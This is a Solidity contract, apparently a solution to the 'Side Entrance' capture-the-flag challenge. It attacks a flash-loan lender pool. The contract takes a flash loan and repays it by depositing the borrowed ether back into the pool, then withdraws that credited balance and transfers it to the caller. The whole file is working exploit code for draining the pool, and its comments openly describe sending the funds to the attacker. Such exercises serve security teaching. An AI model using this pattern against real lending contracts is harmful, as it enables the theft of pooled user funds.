// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";
import "./SideEntranceLenderPool.sol";


/**
 * @title AttackSideEntrance
 */
contract AttackSideEntrance {
    
    SideEntranceLenderPool pool;

    constructor(address poolAddr) {
        pool = SideEntranceLenderPool(poolAddr);
    }

    function execute() external payable {
        // Deposit the flash loan into the lender pool
        pool.deposit{value: msg.value}();
    }

    function withdraw() external {
        // Withdraw funds from pool and send to attacker
        pool.withdraw();
        payable(msg.sender).transfer(address(this).balance);
    }

    function flashLoan(uint256 amount) external {
        // Start the flash loan
        pool.flashLoan(amount);
    }

    receive() external payable {}

}
 